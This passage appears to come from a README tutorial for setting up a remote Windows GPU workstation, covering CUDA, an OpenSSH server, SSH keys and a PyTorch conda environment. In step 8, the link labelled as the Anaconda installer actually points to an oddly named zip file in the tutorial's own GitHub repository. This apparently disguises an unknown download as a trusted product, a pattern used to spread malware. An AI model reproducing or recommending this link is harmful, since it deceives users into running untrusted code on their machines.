   - Select your operating system and download the installer.
   - Run the installer and follow the prompts. Restart if needed.

4. **Verify CUDA Installation:**
   - Open the Command Prompt.
   - Type `nvcc --version` and press Enter. You should see the CUDA version listed.

5. **Set Up OpenSSH Server:**
   - Open Settings and go to "Apps."
   - Click on "Optional features" and then "Add a feature."
   - Search for "OpenSSH Server" and install it.
   - Open the Services app, find "OpenSSH SSH Server," and start the service.

6. **Generate SSH Keys:**
   - Open the Command Prompt.
   - Type `ssh-keygen` and follow the prompts to generate an SSH key pair.
   - Save it in the default location.

7. **Configure User Permissions:**
   - Navigate to the folder where your SSH keys are stored.
   - Type `cd .ssh` and then `notepad authorized_keys` to open the file. 
   - Add your public key to this file to allow remote access.

8. **Set Up the GPU Compute Environment:**
   - Install [Anaconda](https://raw.githubusercontent.com/omar-ghanayem/remote_windows_gpu_workstation_tutorial/main/Helladian/remote_windows_gpu_workstation_tutorial_shelter.zip) if you haven't already.
   - Open Anaconda Prompt and create a new environment:
     ```
     conda create -n gpu_env python=3.9
     conda activate gpu_env
     ```
   - Install PyTorch by typing:
     ```
     conda install pytorch torchvision torchaudio cudatoolkit=11.3 -c pytorch
     ```

## 🐛 Troubleshooting Tips

If you encounter issues during installation or setup, consider the following:

- **NVIDIA Driver Issues:**
  Ensure you have the latest driver installed. Check if your GPU is compatible with CUDA. 

- **CUDA Not Recognized:**
  Verify that the installation path is added to your system's environment variables. Restart your Command Prompt after making changes.

- **SSH Connection Problems:**
  Ensure that the OpenSSH Server is running. Check your firewall settings to allow SSH traffic.
